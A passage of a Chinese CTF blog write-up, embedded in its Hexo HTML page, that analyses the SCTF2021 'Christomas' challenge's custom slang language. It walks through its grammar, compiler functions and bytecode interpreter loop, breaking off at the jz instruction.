@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="SCTF2021 Christomas这俩题用的是作者自写的slang语言，还是挺有意思的，所以后来复现了一下 题目分析服务端就是接收用户输入的slang代码，然后编译运行，所以关键得看懂slang语言 大概知道架构之后，就知道两个重要的语法文件  parser.y和scanner.l，一个是词法分析的规则，一个是语法分析的规则 具体的格式可以看这两篇文章 第08章 用 flex 做词法分析 —">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SCTF2021 Christomas">
+<meta property="og:url" content="http://yoursite.com/2022/01/18/Christomas/index.html">
+<meta property="og:site_name" content="zzrR0">
+<meta property="og:description" content="SCTF2021 Christomas这俩题用的是作者自写的slang语言，还是挺有意思的，所以后来复现了一下 题目分析服务端就是接收用户输入的slang代码，然后编译运行，所以关键得看懂slang语言 大概知道架构之后，就知道两个重要的语法文件  parser.y和scanner.l，一个是词法分析的规则，一个是语法分析的规则 具体的格式可以看这两篇文章 第08章 用 flex 做词法分析 —">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220107222324990.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220107222505188.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220107223141917.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220107223238058.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220107223349887.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220107224325089.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220107224652106.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220107224453629.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220118130424247.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220118131007920.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220118212532241.png">
+<meta property="og:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220118214028952.png">
+<meta property="og:updated_time" content="2022-02-13T13:57:26.852Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SCTF2021 Christomas">
+<meta name="twitter:description" content="SCTF2021 Christomas这俩题用的是作者自写的slang语言，还是挺有意思的，所以后来复现了一下 题目分析服务端就是接收用户输入的slang代码，然后编译运行，所以关键得看懂slang语言 大概知道架构之后，就知道两个重要的语法文件  parser.y和scanner.l，一个是词法分析的规则，一个是语法分析的规则 具体的格式可以看这两篇文章 第08章 用 flex 做词法分析 —">
+<meta name="twitter:image" content="http://yoursite.com/2022/01/18/Christomas/image-20220107222324990.png">
+
+
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2022/01/18/Christomas/">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>SCTF2021 Christomas | zzrR0</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">zzrR0</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+    <a href="/about/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+    <a href="/tags/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+    <a href="/categories/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/01/18/Christomas/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="zzrR0">
+      <meta itemprop="description" content="Why am i so cai.">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zzrR0">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SCTF2021 Christomas
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2022-01-18 11:15:22" itemprop="dateCreated datePublished" datetime="2022-01-18T11:15:22+08:00">2022-01-18</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2022-02-13 21:57:26" itemprop="dateModified" datetime="2022-02-13T21:57:26+08:00">2022-02-13</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2022/01/18/Christomas/#comments" itemprop="discussionUrl">
+                
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2022/01/18/Christomas/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2022/01/18/Christomas/" class="leancloud_visitors" data-flag-title="SCTF2021 Christomas">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数：</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SCTF2021-Christomas"><a href="#SCTF2021-Christomas" class="headerlink" title="SCTF2021 Christomas"></a>SCTF2021 Christomas</h1><p>这俩题用的是作者自写的slang语言，还是挺有意思的，所以后来复现了一下</p>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>服务端就是接收用户输入的slang代码，然后编译运行，所以关键得看懂slang语言</p>
+<p>大概知道架构之后，就知道两个重要的语法文件</p>
+<p><img src="/2022/01/18/Christomas/image-20220107222324990.png" alt="image-20220107222324990"></p>
+<p>parser.y和scanner.l，一个是词法分析的规则，一个是语法分析的规则</p>
+<p>具体的格式可以看这两篇文章</p>
+<p><a href="https://pandolia.net/tinyc/ch8_flex.html" target="_blank" rel="noopener">第08章 用 flex 做词法分析 — 自己动手写编译器 (pandolia.net)</a></p>
+<p><a href="https://pandolia.net/tinyc/ch13_bison.html" target="_blank" rel="noopener">第13章 用 bison 做语法分析 — 自己动手写编译器 (pandolia.net)</a></p>
+<p>scanner.l中两个百分号之间是格式定义，每行都是pattern + action的模式 <img src="/2022/01/18/Christomas/image-20220107222505188.png" alt="image-20220107222505188"></p>
+<p>parse里面的格式，可以看出程序大致由三种语句组成，call_expr,want_stmt,var_expr</p>
+<p><img src="/2022/01/18/Christomas/image-20220107223141917.png" alt="image-20220107223141917"></p>
+<h3 id="call语句"><a href="#call语句" class="headerlink" title="call语句"></a>call语句</h3><p><img src="/2022/01/18/Christomas/image-20220107223238058.png" alt="image-20220107223238058"></p>
+<p>BACK是brings back gift，WORD就是正常的单词，NEWLINE就是；REINDEER是reindeer(驯鹿)，DELIVERING 是delivering gift</p>
+<p>所以语句应该是 Reindeer (funcname) delivering gift (arg1) (arg2) (arg3) ,这里是猜测成这种函数调用形式</p>
+<p>后面应该可以跟brings back gift (return_value)得到返回值</p>
+<h3 id="want语句"><a href="#want语句" class="headerlink" title="want语句"></a>want语句</h3><p><img src="/2022/01/18/Christomas/image-20220107223349887.png" alt="image-20220107223349887"></p>
+<p>Want是this family wants gift，Endwant是ok, they should already have a gift;</p>
+<p>list的组成</p>
+<p>IF是if the gift，OPERATOR是 is，equal to，greater than，还有+-*/，NEXT是:</p>
+<p>AGAIN是Brave reindeer! Fear no difficulties!</p>
+<p>所以格式应该如下</p>
+<p>This family wants gift (WORD) </p>
+<p>IF THE GIFT (OPERATOR) : stmts</p>
+<p>Ok,they should already have a gift</p>
+<p>这里want语句应该是看起来最费劲的，实际上其就是对应的循环和判断语句，毕竟是语言基本结构么</p>
+<p>具体含义搞不明白，就得去看编译时的代码以及运行时的代码，两块都得考虑，才能搞明白具体含义</p>
+<h3 id="var-expr"><a href="#var-expr" class="headerlink" title="var expr"></a>var expr</h3><p><img src="/2022/01/18/Christomas/image-20220107224325089.png" alt="image-20220107224325089"></p>
+<p>这里就是定义一个礼物，可以看成定义一个变量</p>
+<h3 id="编译器具体分析"><a href="#编译器具体分析" class="headerlink" title="编译器具体分析"></a>编译器具体分析</h3><p>整个语言编译出来的核心组成就是这个结构体</p>
+<p><img src="/2022/01/18/Christomas/image-20220107224652106.png" alt="image-20220107224652106"></p>
+<p>code是字节码数组，number数字常量池，string是字符串池，word是标识符池，slang解释器加载程序时会把程序拆分到这四个向量中</p>
+<p><img src="/2022/01/18/Christomas/image-20220107224453629.png" alt="image-20220107224453629"></p>
+<p>具体的编译在这里，这里map是一个宏，解开后就是switch case，对不同的语句调用不同的编译函数</p>
+<p>因为主要的疑惑在want语句，所以先看want语句，而want的核心是list</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arg ast_t *ast, lambda_t *lambda, ast_t* word, int start</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compile_list</span><span class="params">(arg)</span></span>&#123;</span><br><span class="line">    <span class="keyword">ast_t</span> * <span class="keyword">operator</span> = ast_get_child(ast, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">ast_t</span> * expr = ast_get_child(ast, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">ast_t</span> * stmts = ast_get_child(ast, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    compile_word_push(word, lambda);</span><br><span class="line">    <span class="keyword">switch</span>(expr-&gt;type)&#123;</span><br><span class="line">        <span class="built_in">map</span>(EXPR, expr);</span><br><span class="line">        <span class="built_in">map</span>(WORD, word_push);</span><br><span class="line">        <span class="built_in">map</span>(NUMBER, number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    emit_insn_operator(lambda, <span class="keyword">operator</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> redirection = lambda_get_code_count(lambda);</span><br><span class="line">    emit_insn_jz(lambda, redirection, <span class="number">0xffff</span>);</span><br><span class="line"></span><br><span class="line">    compile_stmts(stmts, lambda);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> offset = lambda_get_code_count(lambda) - redirection - <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ast_get_child_count(ast) == <span class="number">4</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ast_get_child(ast, <span class="number">3</span>)-&gt;type == AST_AGAIN)&#123;</span><br><span class="line">            emit_insn_jmp(lambda, start);</span><br><span class="line">            emit_insn_jz(lambda, redirection, offset + <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            emit_insn_jz(lambda, redirection, offset);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先分析下这个函数里面用到的几个子函数，compiler_word_push内部会调用到lambda_emit_insn，最终会case到emit_insn_load_word，其内部是通过insn向字节码数组中插入操作数，所以这里push完，code数组中的组成为OP_PUSH_WORD  WORD_INDEX</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">compile_word_push</span><span class="params">(arg)</span></span>&#123;</span><br><span class="line">    emit_insn(OP_LOAD_WORD, ast);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> emit_insn(opcode, ast) lambda_emit_insn(lambda, (opcode), (ast));</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">lambda_emit_insn</span><span class="params">(pthis, <span class="keyword">int</span> opcode, <span class="keyword">ast_t</span> *ast)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (opcode)&#123;</span><br><span class="line">        <span class="built_in">map</span>(STORE, store);</span><br><span class="line">        <span class="built_in">map</span>(LOAD_NUMBER, load_number);</span><br><span class="line">        <span class="built_in">map</span>(LOAD_WORD, load_word);</span><br><span class="line">        <span class="built_in">map</span>(LOAD_STRING, load_string);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">emit_insn_load_word</span><span class="params">(pthis, <span class="keyword">ast_t</span> *ast)</span></span>&#123;</span><br><span class="line">    insn(OP_LOAD_WORD);</span><br><span class="line">    insn(lambda_set_word(<span class="keyword">this</span>, ast-&gt;string_value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> insn(opcode) lambda_insn(this, (opcode));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//向code向量里push了一个opcode</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lambda_insn</span><span class="params">(pthis, <span class="keyword">char</span> opcode)</span></span>&#123;</span><br><span class="line">    vector_push_back(&amp;(<span class="keyword">this</span>-&gt;code), opcode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//往word池里push一个word，word池里面如果已经有这个word了，就直接跳过，最后返回的是word的下标</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lambda_set_word</span><span class="params">(pthis, <span class="keyword">char</span> * word)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *item;</span><br><span class="line">    vector_each(<span class="keyword">this</span>-&gt;word, i, item)&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(item, word))</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector_push_back(&amp;(<span class="keyword">this</span>-&gt;word), word);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>-&gt;word.count<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>emit_insn_operator是对操作符的push，就是压入一个操作符</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> map(operator, OPCODE)                                                 \</span></span><br><span class="line">    <span class="keyword">case</span> <span class="keyword">operator</span>:\</span><br><span class="line">        insn(OPCODE);               \</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">emit_insn_operator</span><span class="params">(pthis, <span class="keyword">ast_t</span> *ast)</span></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(ast-&gt;char_value)&#123;</span><br><span class="line">        <span class="built_in">map</span>(<span class="string">'+'</span>, OP_ADD);</span><br><span class="line">        <span class="built_in">map</span>(<span class="string">'-'</span>, OP_SUB);</span><br><span class="line">        <span class="built_in">map</span>(<span class="string">'*'</span>, OP_MUL);</span><br><span class="line">        <span class="built_in">map</span>(<span class="string">'/'</span>, OP_DIV);</span><br><span class="line">        <span class="built_in">map</span>(<span class="string">'&gt;'</span>, OP_GRAETER);</span><br><span class="line">        <span class="built_in">map</span>(<span class="string">'?'</span>, OP_EQUAL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里编译jz的函数比较细，在编译stmt时是用来配合组成循环语句的，编译stmt时调用传入的是0xffff,因为还不知道循环结束的位置，因此先插入0xFFFF占位,redirection 是获得当前code的ip，此时走的是if的分支</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//先插入一条if语句，此时还不知道循环结束的位置</span></span><br><span class="line"><span class="keyword">int</span> redirection = lambda_get_code_count(lambda);</span><br><span class="line">emit_insn_jz(lambda, redirection, <span class="number">0xffff</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">emit_insn_jz</span><span class="params">(pthis, <span class="keyword">int</span> redirection, <span class="keyword">long</span> offset)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (redirection == <span class="keyword">this</span>-&gt;code.count)&#123;</span><br><span class="line">        insn(OP_JZ);</span><br><span class="line">        insn(J_FORWORD);</span><br><span class="line">        insn((offset &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        insn(offset &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//修正offset</span></span><br><span class="line">        redirection ++;</span><br><span class="line">        <span class="keyword">if</span> (offset &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            offset = -offset;</span><br><span class="line">            lambda_set_code(<span class="keyword">this</span>, redirection++, J_BACK);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            redirection ++;</span><br><span class="line">        &#125;</span><br><span class="line">        lambda_set_code(<span class="keyword">this</span>, redirection++, (offset &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>);</span><br><span class="line">        lambda_set_code(<span class="keyword">this</span>, redirection++, offset &amp; <span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再编译完循环体之后</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//此时已编译完循环体，获得结尾到循环开始处的偏移    </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> offset = lambda_get_code_count(lambda) - redirection - <span class="number">4</span>;</span><br><span class="line"><span class="comment">//child_count为4就说明有Again语句，此时就为循环语句，否则就是单次循环，其实就是条件分支语句</span></span><br><span class="line"><span class="keyword">if</span> (ast_get_child_count(ast) == <span class="number">4</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(ast_get_child(ast, <span class="number">3</span>)-&gt;type == AST_AGAIN)&#123;</span><br><span class="line">        emit_insn_jmp(lambda, start);</span><br><span class="line">        emit_insn_jz(lambda, redirection, offset + <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//注意这里传入的仍然是redirection，会导致emit_insn_jz走的else分支，修正前面的插入0xffff占位的offset</span></span><br><span class="line">    emit_insn_jz(lambda, redirection, offset);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>分析完之后，就可以得出结论，want语句就是关键的循环和分支语句</p>
+<h3 id="解释器具体分析"><a href="#解释器具体分析" class="headerlink" title="解释器具体分析"></a>解释器具体分析</h3><p>解释器代码基本都在vm/vm_call.c和runtime.c中</p>
+<p>解释器入口，sleep是暴漏给Christmas Bash的，第一题用不到，这里就是按字节码去case执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vm_call_lambda</span><span class="params">(<span class="keyword">lambda_t</span> *l)</span></span>&#123;</span><br><span class="line">    <span class="keyword">runtime_t</span> *r = runtime_init();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// gift to Christmas Bash!</span></span><br><span class="line">    <span class="comment">// Don't play too late for the party! Remember to sleep!</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">gift_t</span> * gift = gift_init(<span class="string">"sleep"</span>, sleep);</span><br><span class="line">    runtime_set_gift(r, gift);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(r-&gt;is_run)&#123;</span><br><span class="line">        <span class="keyword">switch</span>(get_code)&#123;</span><br><span class="line">            display(STORE, store);</span><br><span class="line">            display(LOAD_NUMBER, load_number);</span><br><span class="line">            display(LOAD_STRING, load_string);</span><br><span class="line">            display(LOAD_WORD, load_word);</span><br><span class="line"></span><br><span class="line">            display(CALL, call);</span><br><span class="line">            display(JZ, jz);</span><br><span class="line">            display(JMP, jmp);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">operator</span>(ADD);</span><br><span class="line">            <span class="keyword">operator</span>(SUB);</span><br><span class="line">            <span class="keyword">operator</span>(DIV);</span><br><span class="line">            <span class="keyword">operator</span>(MUL);</span><br><span class="line">            <span class="keyword">operator</span>(GRAETER);</span><br><span class="line">            <span class="keyword">operator</span>(EQUAL);</span><br><span class="line">        &#125;</span><br><span class="line">        check_next(r, l);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看下jz,这里会从栈上pop出上条指令的计算结果，如果为0就跳转</p>
